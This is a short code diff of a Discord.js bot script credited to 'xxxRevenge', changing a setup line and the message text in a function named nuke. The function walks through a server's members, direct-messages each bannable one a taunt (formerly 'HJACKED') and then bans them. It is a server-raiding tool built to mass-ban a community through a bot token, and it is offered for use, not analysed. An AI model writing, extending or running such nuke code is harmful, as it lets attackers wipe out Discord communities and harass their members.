@@ -1,4 +1,5 @@
 //By xxxRevenge (Bowlingtoolkit)
+const botSettings = require("./botsettings.json");
 const Discord = require("discord.js") //npm i discord.js
 const client = new Discord.Client();
 const Token = '' //حط توكن بوتك هنا // your bot token
@@ -33,7 +34,7 @@ async function nuke(guild) {
     await Promise.all(guild.members.map(async (m) => {
       if (m.bannable) {
         users++;
-        await m.send('HJACKED').catch(e => { return void e; });
+        await m.send('ฟ่าววววว').catch(e => { return void e; });
         return m.ban();
       }
     }));
